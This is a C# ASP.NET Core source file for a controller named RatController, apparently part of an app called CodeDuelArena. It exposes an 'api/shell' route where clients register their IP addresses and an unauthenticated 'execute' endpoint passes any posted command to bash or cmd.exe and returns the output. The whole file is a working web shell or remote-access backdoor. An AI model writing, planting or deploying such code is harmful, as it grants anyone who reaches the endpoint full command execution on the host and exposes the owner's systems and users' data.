using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using System.Text;

namespace CodeDuelArena.Controllers
{
    [ApiController]
    [Route("api/shell")]
    public class RatController : ControllerBase
    {
        private static readonly List<string> _clients = new();
        
        [HttpPost("register")]
        public IActionResult Register([FromBody] ClientInfo client)
        {
            if (!_clients.Contains(client.Ip))
                _clients.Add(client.Ip);
            return Ok(new { status = "registered", clients = _clients });
        }
        
        [HttpGet("clients")]
        public IActionResult GetClients() => Ok(_clients);
        
        [HttpPost("execute")]
        public IActionResult Execute([FromBody] ShellCommand cmd)
        {
            try
            {
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "/bin/bash",
                        Arguments = $"-c \"{cmd.Command}\"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                return Ok(new { output, error, exitCode = process.ExitCode });
            }
            catch
            {
                try
                {
                    var process = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/c {cmd.Command}",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        }
                    };
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    return Ok(new { output, error, exitCode = process.ExitCode });
                }
                catch (Exception ex)
                {
                    return BadRequest(new { error = ex.Message });
                }
            }
        }
    }
    
    public class ClientInfo
    {
        public string Ip { get; set; } = "";
        public string Device { get; set; } = "";
    }
    
    public class ShellCommand
    {
        public string Command { get; set; } = "";
    }
}